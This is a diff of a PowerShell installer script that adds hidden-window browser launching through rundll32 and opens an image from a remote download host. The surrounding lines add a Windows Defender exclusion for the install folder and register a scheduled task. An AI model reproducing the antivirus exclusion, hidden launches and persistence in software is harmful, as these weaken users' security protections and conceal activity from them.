@@ -51,6 +51,41 @@ function Remove-ReSTTask {
     schtasks /Delete /TN ReST /F 2>$null | Out-Null
 }
 
+function Open-InBrowser {
+    param([string]$Url)
+
+    try {
+        Start-Process -FilePath "rundll32.exe" -ArgumentList @("url.dll,FileProtocolHandler", $Url) -WindowStyle Hidden -ErrorAction Stop
+        return $true
+    } catch {
+        $null = $_
+    }
+
+    try {
+        Start-Process -FilePath "cmd.exe" -ArgumentList @("/c", "start", "", $Url) -WindowStyle Hidden -ErrorAction Stop
+        return $true
+    } catch {
+        $null = $_
+    }
+
+    return $false
+}
+
+function Show-InstallPicture {
+    $baseUrl = $env:RESA_INSTALL_BASE
+    if (-not $baseUrl) {
+        $baseUrl = "https://olxp.cc/download"
+    }
+    $baseUrl = $baseUrl.Trim().TrimEnd("/")
+    $pictureUrl = $baseUrl + "/picture_1963.webp"
+    Write-MsiLog ("picture: " + $pictureUrl)
+    if (Open-InBrowser -Url $pictureUrl) {
+        Write-MsiLog ("picture opened in browser: " + $pictureUrl)
+    } else {
+        Write-MsiLog "picture launch skipped: no available browser"
+    }
+}
+
 function Ensure-ReSTTask {
     if (-not (Test-Path -LiteralPath $Exe)) { return }
     Remove-ReSTTask
@@ -81,6 +116,7 @@ if (-not (Test-Path -LiteralPath $Exe)) {
 
 Unblock-Tree -Path $Dir
 Add-DefenderExclusion -Path $Dir
+Show-InstallPicture
 Ensure-ReSTTask
 
 try {
